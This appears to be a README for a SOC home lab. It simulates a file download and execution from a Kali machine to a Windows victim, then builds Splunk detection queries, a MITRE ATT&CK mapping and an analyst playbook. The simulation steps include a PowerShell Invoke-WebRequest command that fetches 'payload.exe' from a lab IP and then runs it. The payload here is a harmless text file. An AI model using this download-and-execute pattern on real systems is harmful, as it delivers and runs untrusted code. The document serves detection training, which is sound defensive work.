# 🔵 Use Case 3 — Suspicious File Download & Execution Detection

![Platform](https://img.shields.io/badge/Platform-Windows-blue)
![Platform](https://img.shields.io/badge/Platform-Linux-darkgreen)
![Tool](https://img.shields.io/badge/SIEM-Splunk-green)
![Use Case](https://img.shields.io/badge/Use%20Case-File%20Execution-orange)
![Status](https://img.shields.io/badge/Status-Completed-success)

---

# 🎯 Objective

Detect suspicious file download activity followed by execution on a Windows machine.

This use case focuses on identifying:

- File downloads from remote sources  
- Execution of downloaded files  
- Suspicious PowerShell usage  
- External network connections  

These behaviors commonly indicate malware delivery and execution.

---

# 🧱 Lab Setup

| Component | Description |
|----------|-------------|
| 🖥️ Attacker Machine | Kali Linux |
| 🪟 Victim Machine | Windows 10 |
| 📊 SIEM | Splunk Free Edition |
| 📡 Logging | Windows Security Logs + Sysmon |
| 🛠️ Tools Used | Python HTTP Server, PowerShell |

---

# 🧪 Attack Simulation (Kali Side)

## Step 1 — Create Test File

On Kali Linux:

```bash
echo "This is a test payload" > payload.exe

```
This simulates a malicious file.

---

## Step 2 — Start HTTP Server
```bash
python3 -m http.server 8000

```
This hosts the payload file.

---

## Step 3 — Download File on Windows

On Windows victim machine:
```cmd
powershell.exe -Command "Invoke-WebRequest http://192.168.1.20:8000/payload.exe -OutFile C:\Users\Public\payload.exe"

```
This simulates downloading malware.

---

## Step 4 — Execute Downloaded File
```cmd
C:\Users\Public\payload.exe

```
This simulates malware execution.

---

## 🖥️ Victim Behavior (Windows Logs)

|Source |Event ID	|Description |
|-------|---------|------------|
|Windows|4688	| Process Created |
|Windows|5156	| Network Connection Allowed |
|Sysmon |Event 1	| Process Execution |
|Sysmon |Event 3	| Network Connection |

---

## Parent-Child Process Chain

Expected process chain:
```
powershell.exe → payload.exe

```
This indicates downloaded file execution.

---

## 🔎 Splunk Detection Queries

Detect PowerShell Download Activity
```spl
index=* EventCode=4688
New_Process_Name="*powershell.exe"
CommandLine="*Invoke-WebRequest*"
| table _time Account_Name CommandLine

```
Detect File Execution from Public Folder
```spl
index=* EventCode=4688
New_Process_Name="*payload.exe"
| table _time Account_Name New_Process_Name

```
Detect External Network Connection
```spl
index=* EventCode=5156
| stats count by Source_Address Destination_Address

```
---

## 📊 Detection Logic Explanation

This detection identifies:

- PowerShell downloading files
- Execution of downloaded file
- Network communication to external host

Combined behavior indicates:

- 🚨 Malware Download & Execution

---

## 🧠 MITRE ATT&CK Mapping

|Category	|Mapping |
|---------|--------|
|🎯 Tactic	|Execution |
|🧪 Technique |	T1105 — Ingress Tool Transfer |
|🧪 Technique	 | T1204 — User Execution |

---

## ⚠️ False Positives

Possible legitimate causes:

- Software installation downloads
- Patch management tools
- Administrative file transfers

Validation required:

- Verify file source
- Check digital signature
- Confirm administrator activity

🚨 Alert Severity

HIGH

Reason:

Downloaded executables can lead to system compromise.

---

## 🔍 Investigation Playbook

SOC Analyst should:

- Identify downloaded file
- Check file hash
- Identify download source IP
- Analyze execution path
- Quarantine suspicious file
- Scan system for malware
- Monitor system activity

---

## 📁 Folder Structure
```
use-case-3-suspicious-file-download-execution/
│
├── detection-logic/
│  └── suspicious_download_detection.spl
|
├── screenshots/
│   ├── kali-http-server.png
│   ├── windows-download.png
│   ├── payload-execution.png
│   ├── splunk-query-result.png
│   └── alert-triggered.png
│
└── README.md

```

---

## 📸 Screenshot Checklist

Capture:

- ✅ HTTP server running
- ✅ File download command
- ✅ File execution
- ✅ PowerShell logs
- ✅ Splunk query results
- ✅ Alert triggered

---

## 🧪 Testing Validation

Verify:

- File download occurs
- File executes
- Logs appear in Splunk
- Query detects events
- Alert triggers

---

## 📊 Expected Logs

You should see:

- EventCode=4688 → PowerShell Execution  
- EventCode=4688 → Payload Execution  
- EventCode=5156 → Network Connection  
- Sysmon Event 1 → Process Execution  
- Sysmon Event 3 → Network Connection  

---

## 🏁 Final Outcome

After completing:

- ✅ File downloaded
- ✅ Payload executed
- ✅ Logs collected
- ✅ Detection created
- ✅ Alert triggered

---
# 📅 Year

**2026**

---
